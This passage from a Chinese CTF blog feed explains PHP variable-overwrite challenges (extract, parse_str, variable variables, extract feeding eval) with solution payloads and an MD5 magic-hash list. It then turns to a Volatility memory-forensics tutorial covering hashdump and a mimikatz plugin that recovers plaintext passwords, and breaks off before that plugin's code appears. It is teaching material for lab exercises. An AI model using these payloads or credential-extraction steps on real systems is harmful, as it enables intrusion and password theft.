title="0x03-例题演示"></a>0x03-例题演示</h2><p>这里会根据做题时碰到此类的题目不断更新进去….</p><p>参考：<a href="https://www.cnblogs.com/wrnan/p/12520118.html#extract%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96">https://www.cnblogs.com/wrnan/p/12520118.html#extract%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96</a></p><h3 id="例题1-extract"><a href="#例题1-extract" class="headerlink" title="例题1-extract"></a>例题1-extract</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">extract(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$bdctf</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$content</span>=trim(file_get_contents(<span class="variable">$flag</span>));<span class="comment">//file_get_contents—将整个文件读入一个字符串</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$bdctf</span>==<span class="variable">$content</span>)                             <span class="comment">//trim—去除字符串首尾处的空白字符（或者其他字符）</span></span><br><span class="line">        &#123; <span class="keyword">echo</span><span class="string">&#x27;bdctf&#123;**********&#125;&#x27;</span>; &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        &#123; <span class="keyword">echo</span><span class="string">&#x27;这不是蓝盾的密码啊&#x27;</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解析：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.首先读源码，我们发现,需要给$bdctf变量一个值才能进入下方的判断，所以肯定是利用$_GET传参bdctf=xx了</span><br><span class="line">2.$content读取了$flag的内容，我们不知道flag是什么</span><br><span class="line">3.判断我们传输的bdctf的值与$content的内容是否相等，如果相等就会输出flag</span><br><span class="line"></span><br><span class="line">这里我们肯定是用bdctf参数传值了，传什么才能和$content相等呢?</span><br><span class="line">这里的先给出payload：?bdctf=&amp;$content</span><br><span class="line">这是前两天做题时候学到的一个知识点，原理就是让bdctf的地址等于$content的地址，</span><br><span class="line">此时取的值都是$content变量地址对应的值，此时就达成了bdctf的值与$content的内容的条件了</span><br></pre></td></tr></table></figure><p>疑惑：</p><p>直接传?bdctf=    传空值也能拿到flag，难道是因为$flag没有赋值的原因吗？</p><h3 id="例题2-parse-str"><a href="#例题2-parse-str" class="headerlink" title="例题2-parse_str"></a>例题2-parse_str</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;                    <span class="comment">//empty()检查是否为空</span></span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);            <span class="comment">//highlight_file—语法高亮一个文件</span></span><br><span class="line">    <span class="keyword">die</span>();                                          <span class="comment">//等同于exit—输出一个消息并且退出当前脚本</span></span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">include</span> (<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$a</span> = <span class="string">&quot;www.OPENCTF.com&quot;</span>;</span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    @parse_str(<span class="variable">$id</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span>[<span class="number">0</span>] != <span class="string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; md5(<span class="variable">$a</span>[<span class="number">0</span>]) == md5(<span class="string">&#x27;QNKCDZO&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;其实很简单其实并不难！&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>解析：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.如果id参数为空，则显示题目源码</span><br><span class="line">2.包含了flag.php，知道了flag位置</span><br><span class="line">3.id参数的参数经过parse_str()函数处理，可以进行变量覆盖，传参形式id=a[0]=值</span><br><span class="line">4.取a[0]的值做一个md5弱类型比较，这里让a[0]=特定值即可</span><br><span class="line"></span><br><span class="line">传参：http://127.0.0.1/false.php?id=a[0]=s878926199a</span><br><span class="line">这里利用parse_str()函数，此函数会将把查询字符串解析到变量中</span><br><span class="line">也就是parse_str()函数内容为xx=aa，这类的形式时，会经过处理后——&gt;可以理解为$xx=&#x27;aa&#x27;;</span><br><span class="line">这里直接给$a[0]变量进行覆盖重新赋值，即可拿到flag</span><br></pre></td></tr></table></figure><p><strong>md5弱类型的一些特殊值</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">  </span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">  </span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br></pre></td></tr></table></figure><h3 id="例题3-可变变量"><a href="#例题3-可变变量" class="headerlink" title="例题3-可变变量"></a>例题3-可变变量</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$_403</span>=<span class="string">&#x27;403&#x27;</span>;</span><br><span class="line"><span class="variable">$_200</span>=<span class="string">&#x27;200&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>]!= <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nonono,plase POST&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$_403</span>.<span class="string">&#x27;_1&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$$value</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] !== <span class="variable">$flag</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$_403</span>.<span class="string">&#x27;_2&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This is your flag:&quot;</span>.<span class="variable">$flag</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$_200</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>解析：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.首先必须使用POST方式传递一个参数，并且这个参数必须是flag才能进入到下方的foreach遍历</span><br><span class="line">2.第一个遍历了get参数，第二个遍历了post的参数</span><br><span class="line">3.如果我们利用post方式去想办法拿到flag的话，会发现$flag被重新赋值了，怎样都相等，但就是因为被重新赋值了，导致读不到flag</span><br><span class="line">4.利用get参数来拿flag，$$key = $$value;</span><br><span class="line">传参：http://127.0.0.1/false.php?_200=flag    POST[DATA]: flag</span><br><span class="line">此时利用get传参时的可变变量，变为了$_200 = $flag,在想办法输出$_200就可以了</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">因为post传参经过foreach处理后flag就被重新赋值了，读不到正确的flag</span><br><span class="line">所以只能通过get来把$flag内容给到$_200变量中，想办法输出$_200</span><br><span class="line">然后post的flag参数是必须的，不然程序无法运行下方代码</span><br></pre></td></tr></table></figure><h3 id="例题4-可变变量"><a href="#例题4-可变变量" class="headerlink" title="例题4-可变变量"></a>例题4-可变变量</h3><p>这道题是Hh0师傅提供哒</p><p>Hh0师傅博客：<a href="https://www.cnblogs.com/wrnan/">https://www.cnblogs.com/wrnan/</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="string">&#x27;source.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;xxxxxxxx&#x27;</span>;</span><br><span class="line"><span class="variable">$msg_giveme</span> = <span class="string">&#x27;Give me the flag!&#x27;</span>;</span><br><span class="line"><span class="variable">$msg_getout</span> = <span class="string">&#x27;No this. Get out!&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$msg_giveme</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span> || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$msg_getout</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;the flag is : &#x27;</span> . <span class="variable">$flag</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>解析：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1.第一个if语句，GET或POST方式，至少有一个要用flag传参</span><br><span class="line">2.GET或POST方式传参的值不能等于flag</span><br><span class="line">3.两个foreach()遍历GET和POST的传值,其中$_GET方式中的可变变量可以涉及到两个变量</span><br><span class="line">所以这里在get方式上做一些操作</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">传参：http://127.0.0.1/1.php?msg_giveme=flag&amp;flag=msg_giveme</span><br><span class="line">解释：</span><br><span class="line">$_GET方式传参时，参数任意，传参的参数会变为数组的键，传参的值会变为对应的值</span><br><span class="line">GET方式传参时遍历数组会执行右方代码——&gt;  $$key = $$value</span><br><span class="line">可以看出这是两个可变变量，可以通过控制传入的参数来达到给两个变量重新赋值的目的</span><br><span class="line">?msg_giveme=flag    ——&gt;   $msg_giveme = $flag</span><br><span class="line">&amp;flag=msg_giveme    ——&gt;   $flag = $msg_giveme</span><br><span class="line">这两步看似多此一举，其实刚好绕过了题目中两个if语句的判断</span><br></pre></td></tr></table></figure><h3 id="例题5-匿名函数-extract"><a href="#例题5-匿名函数-extract" class="headerlink" title="例题5-匿名函数-extract"></a>例题5-匿名函数-extract</h3><p>参考链接：<a href="https://www.cnblogs.com/potatsoSec/p/13520546.html">https://www.cnblogs.com/potatsoSec/p/13520546.html</a></p><p>参考链接：<a href="https://www.cnblogs.com/limanman233/p/13524372.html?from=timeline">https://www.cnblogs.com/limanman233/p/13524372.html?from=timeline</a></p><p>例题5于2020-8-18更新，源自某漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$main</span> = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$argv</span></span>)</span>&#123;</span><br><span class="line">    extract(<span class="variable">$argv</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">$main</span>(<span class="variable">$_REQUEST</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>解析：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.首先，这种函数的定义方式叫做匿名函数，不理解可以看一下前置知识</span><br><span class="line">2.函数内部存在extract()函数，默认配置可以触发变量覆盖</span><br><span class="line">3.if判断，如果传入了$code变量就会触发eval($code)，达到代码执行的目的</span><br><span class="line"></span><br><span class="line">payload：http://127.0.0.1/false.php?code=phpinfo();</span><br><span class="line">解释：</span><br><span class="line">首先通过$main变量调用匿名函数，因为是$_REQUEST方式传参，这里get、post都可以</span><br><span class="line">然后因为$main匿名函数内部存在变量覆盖，所以直接传入code=要执行代码   经过extract处理即可完成代码执行</span><br><span class="line"></span><br><span class="line">extract($_REQUEST);  ——&gt;  ?code=phpinfo();  ——&gt; Array ( [code] =&gt; phpinfo(); ) </span><br><span class="line">——&gt;$code = &#x27;phpinfo();&#x27;;   ——&gt;eval($code);  ——&gt;phpinfo页面</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://p0sec.net/index.php/archives/35/">https://p0sec.net/index.php/archives/35/</a></p><p><a href="https://www.jianshu.com/p/a4d782e91852">https://www.jianshu.com/p/a4d782e91852</a></p><p><a href="https://www.bilibili.com/video/BV12D4y1U75j?t=202&amp;p=9">https://www.bilibili.com/video/BV12D4y1U75j?t=202&amp;p=9</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;如果文章内哪里写的有问题欢迎各位师傅加qq提醒我一下&lt;/p&gt;
&lt;p&gt;这几天在学习php反序列化，然后尝试做了几道题，发现总会碰到那么几个有关变量覆盖的知识点，卡的我好难受，因为之前没有学过，这里来记录一下变量覆盖以及$_GET的传值方式&lt;/p&gt;
&lt;h2 id=&quot;0x01-前</summary>
      
    
    
    
    <category term="WEB" scheme="http://blog.falsectf.top/categories/WEB/"/>
    
    
    <category term="WEB" scheme="http://blog.falsectf.top/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>Volatility&amp;mimikatz</title>
    <link href="http://blog.falsectf.top/2020/08/06/4e16e28a.html"/>
    <id>http://blog.falsectf.top/2020/08/06/4e16e28a.html</id>
    <published>2020-08-06T02:24:22.000Z</published>
    <updated>2020-12-31T12:27:34.461Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>首先介绍一下我喜欢用的两个工具</p><p>Dumpit-github下载：<a href="https://raw.githubusercontent.com/thimbleweed/All-In-USB/master/utilities/DumpIt/DumpIt.exe">DumpIt</a> </p><p>即刻安全的下载链接：<a href="http://www.secist.com/wp-content/uploads/2016/11/DumpIt.zip">Dumpit</a> </p><p>内存取证工具：Linux下的 Volatility 、windows下的取证大师等</p><p>Volatility是一款基于python2开发的内存取证工具，是一款命令行工具。</p><p>volatility 框架是一款用于易失性内存取证的重量级框架。在该框架下我们可以完成许多取证的操作，获取我们想取得的信息。其支持的操作系统也非 常广泛，同时支持 windows , linux, Mac OSX,甚至也支持 Android 手机使用ARM处理器的取证。因此，它也是所有网络取证爱好者的必学框架。</p><p>dumpit也是一款命令行工具，使用非常简单，双击运行，然后按一下  y  即可抓取内存镜像</p><p><img src="/images/volatility/dumpit.png"></p><h2 id="Volatility安装"><a href="#Volatility安装" class="headerlink" title="Volatility安装"></a>Volatility安装</h2><p>因为是基于python开发的，所以它在linux和windows系统上都可以运行</p><p><strong>windows下安装</strong>：这里百度一下吧，我没有win下安装过，因为linux下用起来会比较方便</p><p>官方链接：<a href="https://www.volatilityfoundation.org/releases">https://www.volatilityfoundation.org/releases</a></p><p><strong>linux下安装</strong>：非常简单，我是直接直接使用apt下载就安装完成了</p><p>如果是kali系统的话，这个工具是自带的，不需要手动安装</p><p>下面是ubuntu的安装方法，如果没有python2先安装python，有的话安装python可以省略</p><p>下载好volatility后，尝试使用，如果缺少库，缺什么直接pip install 库名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install python</span><br><span class="line">apt-get install python-pip</span><br><span class="line">apt-get install volatility</span><br></pre></td></tr></table></figure><h2 id="Volatility使用"><a href="#Volatility使用" class="headerlink" title="Volatility使用"></a>Volatility使用</h2><p>基础语法：volatility -f &lt;文件名&gt; -–profile=&lt;配置文件&gt; &lt;插件&gt; [插件参数] </p><p>在使用的时候可以使用volatility -h参数，查看帮助手册，了解更多的插件信息</p><p>下面列举一些我在做ctf题目时候比较常用的插件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">原生插件：</span><br><span class="line">imageinfo显示目标镜像的摘要信息，知道镜像的操作系统后，就可以在 –profile 中带上对应的操作系统</span><br><span class="line">pslist该插件列举出系统进程，但它不能检测到隐藏或者解链的进程，psscan可以</span><br><span class="line">psscan可以找到先前已终止(不活动)的进程以及被rootkit隐藏或解链的进程</span><br><span class="line">pstree以树的形式查看进程列表，和pslist一样，也无法检测隐藏或解链的进程</span><br><span class="line">mendump提取出指定进程，常用foremost 来分离里面的文件</span><br><span class="line">dumpfiles根据文件偏移提取文件</span><br><span class="line">filescan扫描所有的文件列表</span><br><span class="line">hashdump查看当前操作系统中的 password hash，例如 Windows 的 SAM 文件内容</span><br><span class="line">svcscan扫描 Windows 的服务</span><br><span class="line">connscan查看网络连接</span><br><span class="line">iehistory查询Internet Explorer缓存/历史记录 &quot; 偶尔有用 &quot; 或者 &quot; yarascan &quot;</span><br><span class="line">envars  查看windows系统环境变量信息</span><br><span class="line">consoles输出控制台(cmd)执行结果信息</span><br><span class="line">cmdline显示命令行过程命令行参数</span><br><span class="line">cmdscan通过扫描命令历史记录来提取命令历史记录  &quot; 常用 &quot;</span><br><span class="line">notepad查看编辑器中的信息   xp系统</span><br><span class="line">editbox查看编辑器中的信息   非xp系统，win7中可用</span><br><span class="line">clipboard -v：查看剪贴板中的信息</span><br><span class="line"></span><br><span class="line">扩展插件：</span><br><span class="line">mimikatz当用户登陆后，会把密码保存在lsass内存中，对其使用可逆算法进行加密存储在内存之中，而mimikatz正是通过对lsass进程的逆运算获取明文密码</span><br></pre></td></tr></table></figure><p><strong>工具基本操作流程</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">信息搜集</span><br><span class="line">volatility -f xxxx.raw imageinfo           // imageinfo 命令 对镜像文件进行读取，筛选出对应的操作系统</span><br><span class="line">volatility -f xxxx.raw --profile=Win2008R2SP1x64          // --profile=   命令指定一个操作系统</span><br><span class="line">volatility -f xxxx.raw --profile=Win2008R2SP1x64 pslist   // 读取内存中的进程列表 与 &quot; psscan &quot; 类似</span><br><span class="line">volatility -f xxxx.raw --profile=Win2008R2SP1x64 filescan // 读取内存中的所有文件，可以配合&quot; grep &quot;进行使用</span><br><span class="line">volatility -f xxxx.raw --profile=Win2008R2SP1x64 notepad  // 查看当前展示的notepad文本 &quot; 对于一些系统不支持 &quot; 用&quot; editbox &quot;插件读取</span><br><span class="line">volatility -f xxxx.raw --profile=Win2008R2SP1x64 cmdscan  // 读取内存中 在cmd中输入的信息 </span><br><span class="line"></span><br><span class="line">文件提取</span><br><span class="line">volatility -f xxxx.raw --profile=WinXPSP2x86 dumpfiles -Q 0x0000000001155f90 -D ./        //根据filescan搜索到的文件的偏移地址提取文件</span><br><span class="line">volatility -f xxxx.raw --profile=WinXPSP2x86 memdump -p 1476 -D ./      //根据pslist查看的pid提取 </span><br><span class="line"></span><br><span class="line">分离文件</span><br><span class="line">可以先使用strings命令配合grep查找一些有价值的信息</span><br><span class="line">使用 binwalk 或 foremast 工具进行分离</span><br></pre></td></tr></table></figure><p><strong>可疑信息收集方法</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">volatility -f xxxx.raw --profile=Win2008R2SP1x64 pslist  //找到explorer.exe对应的进程  explorer是文件管理器配</span><br><span class="line">volatility -f xxxx.raw --profile=WinXPSP2x86 memdump -p 1476 -D ./    //根据explorer.exe对应的pid提取出来 进行分析 strings grep</span><br><span class="line">volatility -f xxxx.raw --profile=Win2008R2SP1x64 filescan | grep Desktop   //查看桌面文件</span><br><span class="line">volatility -f xxxx.raw --profile=Win2008R2SP1x64 filescan | grep flag      //直接找flag -前提是文件名字有这么明显</span><br><span class="line">volatility -f xxxx.raw --profile=Win2008R2SP1x64 cmdscan                   // 读取内存中 在cmd中输入的信息 </span><br><span class="line">volatility -f xxxx.raw --profile=Win2008R2SP1x64 editbox                   //读取记事本中的数据</span><br><span class="line">volatility -f xxxx.raw --profile=Win2008R2SP1x64 yarascan                  //读取浏览器信息</span><br><span class="line">volatility -f xxxx.raw --profile=Win2008R2SP1x64 iehistory                 //读取浏览器信息</span><br><span class="line">volatility -f xxx.raw --profile=Win7SP1x64 filescan | grep -E &#x27;.jpg|.png|.jpeg|.bmp|.gif|flag|.txt|.zip|.rar|.7z|.mp3|.mp4&#x27;             //搜索对应后缀的文件</span><br></pre></td></tr></table></figure><p><strong>系统进程</strong></p><p>这里先占个坑，有空来写~</p><h2 id="扩展插件-mimikatz"><a href="#扩展插件-mimikatz" class="headerlink" title="扩展插件-mimikatz"></a>扩展插件-mimikatz</h2><p>mimikatz是一个非常好用的插件，它可以直接读取明文密码，省去了我们读取hash然后解密的过程</p><p><strong>安装</strong></p><p>0x01：首先，知道一个小知识，volatility的插件默认目录为：/usr/lib/python2.7/dist-packages/volatility/plugins/</p><p>0x02：然后将下方的python代码复制到一个文件中，取名为   <strong>mimikatz.py</strong>，文件名决定了插件的名字！！！很重要</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span 